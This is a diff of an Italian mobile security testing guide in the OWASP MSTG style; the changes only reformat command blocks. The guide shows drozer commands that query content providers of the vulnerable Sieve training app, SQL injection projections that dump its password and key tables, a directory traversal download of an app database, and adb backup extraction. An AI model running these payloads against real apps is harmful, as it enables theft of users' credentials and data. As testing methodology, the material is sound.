@@ -312,7 +312,9 @@ Package: com.mwr.example.sieve
 
 Per identificare le URI dei content provider usa drozer:
 
-	dz> run scanner.provider.finduris -a com.mwr.example.sieve
+```sh
+dz> run scanner.provider.finduris -a com.mwr.example.sieve
+```
 	
 ```
 Scanning com.mwr.example.sieve...
@@ -333,7 +335,9 @@ Accessible content URIs:
 	
 Ottenute le URI prova a estrarre i dati:
 
-	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+```sh
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+```
 	
 ```
      _id  1
@@ -345,29 +349,33 @@ password  Su2BcNE5fofOONqpeLrLJQ9OsGQHZ3mrfqo/ (Base64-encoded)
 
 Puoi anche eseguire insert, update e delete tramite drozer:
 
-	dz> run app.provider.insert content://com.vulnerable.im/messages
-		--string date 1331769850325
-		--string type 0
-		--string _id 7
+```sh
+dz> run app.provider.insert content://com.vulnerable.im/messages
+	--string date 1331769850325
+	--string type 0
+	--string _id 7
 
-	dz> run app.provider.update content://settings/secure
-		--selection "name=?"
-		--selection-args assisted_gps_enabled
-		--integer value 0
+dz> run app.provider.update content://settings/secure
+	--selection "name=?"
+	--selection-args assisted_gps_enabled
+	--integer value 0
 
-	dz> run app.provider.delete content://settings/secure
-		--selection "name=?"
-		--seelction-args my_settings
+dz> run app.provider.delete content://settings/secure
+	--selection "name=?"
+	--seelction-args my_settings
+```
 
 Puoi provare delle SQL injection tramite drozer:
 
-	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'" unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
+```sh
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'" unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
 
-	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
 
 Puoi sfruttare una vulnerabilità di SQL injection per enumerare le tabelle dal database
 
-	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
+```
 	
 ```
 | type
@@ -382,7 +390,9 @@ Puoi sfruttare una vulnerabilità di SQL injection per enumerare le tabelle dal 
 
 Oppure per estrarre informazioni sensibili
 
-	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
+```sh
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
+```
 
 ```
 | Password | pin |
@@ -391,17 +401,23 @@ Oppure per estrarre informazioni sensibili
 
 Questo processo può essere automatizzato:
 
-	dz> run scanner.provider.injection -a com.mwr.example.sieve
+```sh
+dz> run scanner.provider.injection -a com.mwr.example.sieve
+```
 
 I content provider possono fornire accesso anche al filesystem.
 Ciò permette alle app di condividere i file (la sandbox Android di solito lo evita).
 Questi content provider sono suscettibili a directory traversal.
 
-	dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
+```sh
+dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
+```
 
 Puoi automatizzare la ricerca di content provider suscettibili a directory traversal:
 
-	dz> run scanner.provider.traversal -a com.mwr.example.sieve
+```sh
+dz> run scanner.provider.traversal -a com.mwr.example.sieve
+```
 	
 ```
 Scanning com.mwr.example.sieve...
@@ -420,7 +436,9 @@ Vulnerable Providers:
 	
 Puoi usare anche `adb` per interrogare i content provider:
 
-	$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
+```sh
+$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
+```
 
 ## Checking for Sensitive Data Disclosure Through the User Interface (MSTG-STORAGE-7)
 
@@ -459,23 +477,33 @@ Quindi cerca la classe che estende `BackupAgent` o `BackupAgentHelper`.
 Dopo aver eseguito tutte le funzioni dell'app disponibili, prova a fare il backup dell'app con `adb`.
 Prova poi a ispezionare il backup per trovare informazioni sensibili.
 
-	$ adb backup -apk -nosystem <package-name>
+```sh
+$ adb backup -apk -nosystem <package-name>
+```
 
 Converti il backup `.ab` in `.tar`
 
-	$ dd if=mybackup.ab bs=24 skip=1|openssl zlib -d > mybackup.tar
+```sh
+$ dd if=mybackup.ab bs=24 skip=1|openssl zlib -d > mybackup.tar
+```
 
 Se ottieni l'errore `Invalid command 'zlib'; type "help" for a list.`
 
-	$ dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
+```sh
+$ dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
+```
 
 Un alternativa è Android Backup Extractor.
 
-	$ java -jar abe.jar unpack backup.ab
+```sh
+$ java -jar abe.jar unpack backup.ab
+```
 
 Estrai il backup dal file `tar` creato
 
-	$ tar xvf mybackup.tar
+```sh
+$ tar xvf mybackup.tar
+```
 	
 \# TODO prova backup di specifica app
 
